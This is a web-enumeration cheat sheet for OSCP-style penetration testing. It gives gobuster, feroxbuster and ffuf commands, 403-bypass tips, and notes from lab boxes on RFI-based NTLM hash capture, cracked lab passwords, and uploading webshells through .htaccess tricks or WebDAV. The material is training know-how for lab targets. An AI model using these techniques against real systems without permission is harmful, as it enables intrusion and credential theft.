## Directory Brute Force

```bash
# Gobuster
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,asp,aspx

# Gobuster with cookies/auth
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -c "session=abc123"

# Feroxbuster (recursive, faster)
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Feroxbuster with extensions
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak

# Dirsearch
dirsearch -u http://$IP -w /usr/share/wordlists/dirb/common.txt
```

## VHost Discovery

```bash
gobuster vhost -u http://domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# With ffuf (filter by response size)
ffuf -u http://domain.htb -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

Add discovered vhosts to `/etc/hosts`.

- `http://$IP/.DS_Store`
- Backup files: `.bak`, `.old`, `~`, `.swp`, `.sav`, `.orig`

## Tips

- Different response codes matter: 200, 301 (redirect), 403 (exists but forbidden), 500 (server error, interesting)
- **HTTPS may serve completely different content than HTTP** - always check both
- Check SSL cert for hostnames: `openssl s_client -connect $IP:443` - may reveal internal hostnames → add to /etc/hosts
- Try HTTP verbs: PUT, DELETE, PATCH, OPTIONS
- Parameter fuzzing: `ffuf -u http://$IP/page?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`
- **For HTTPS**: add `-k` flag to gobuster/feroxbuster/curl to skip cert verification
- **Non-standard ports**: always check HTTP on weird ports too (8080, 8443, 3000, 5000, 8888, 9090)
- **403 bypass**: try `/admin/` vs `/Admin/` vs `/admin/.` vs adding `X-Forwarded-For: 127.0.0.1` header
- **The single most common OSCP web finding**: a CMS with an exploitable version or default creds. Always identify the technology first.

## From Your Boxes

> **Pilgrimage** (HTB) - Gobuster found `/.git` directory exposed. Used git-dumper to pull source code, discovered ImageMagick binary (v7.1.0-49) and SQLite DB path. Led to arbitrary file read CVE and credential extraction.
> - What worked: `gobuster dir -u http://pilgrimage.htb/ -w SecLists/Discovery/Web-Content/big.txt -x php` found `/.git`
> - Lesson: Always check for `.git` - source code reveals tech stack, DB paths, and exploitable versions.

> **Flight** (HTB) - Vhost fuzzing found `school.flight.htb` with `?view=` parameter vulnerable to RFI. Used RFI to trigger SMB auth to Responder, capturing NTLMv2 hash for `svc_apache`, cracked to `S@Ss!K@*t13`. Password spraying found reuse by `s.moon`.
> - What worked: `wfuzz -u http://TARGET_IP -H "Host: FUZZ.flight.htb"` then `http://school.flight.htb/index.php?view=//TARGET_IP/test`
> - Lesson: PHP `?view=` or `?page=` parameters scream LFI/RFI. Test with SMB paths for NTLM hash capture.

> **Remote** (HTB) - Gobuster found `/umbraco` CMS. NFS share exposed site backups containing Umbraco `.sdf` database with admin SHA1 hash. Cracked to `baconandcheese`. Authenticated RCE exploit for Umbraco 7.12.4.
> - What worked: `gobuster dir -u http://TARGET_IP/ -w SecLists/Discovery/Web-Content/big.txt -x php` found `/umbraco`
> - Lesson: CMS identification is the #1 priority. Check version, search for authenticated RCE exploits.

> **Access** (PG/Windows) - File upload form blocked PHP extensions. Uploaded custom `.htaccess` with `AddType application/x-httpd-php .bypass` then uploaded PHP webshell as `webshell.bypass` to bypass the filter.
> - What worked: `echo "AddType application/x-httpd-php .bypass" > .htaccess` then uploaded PHP shell with `.bypass` extension
> - Lesson: If file upload blocks PHP, try uploading `.htaccess` to redefine what extensions Apache treats as PHP.

> **Hutch** (PG/Windows) - Nmap revealed WebDAV enabled on IIS with PUT/DELETE/MOVE methods allowed. After finding LDAP creds, uploaded aspx webshell via WebDAV for RCE.
> - What worked: WebDAV upload of `cmdasp.aspx` using found credentials
> - Lesson: WebDAV with PUT enabled = file upload without needing a web form. Check `http-webdav-scan` nmap results.

> **Devvortex** (HTB) - Subdomain enumeration found a Joomla instance. Version check + known CVE led to credential extraction and RCE.
> - What worked: Subdomain brute force found the CMS on a vhost
> - Lesson: The CMS is often on a subdomain, not the root. Always enumerate vhosts.
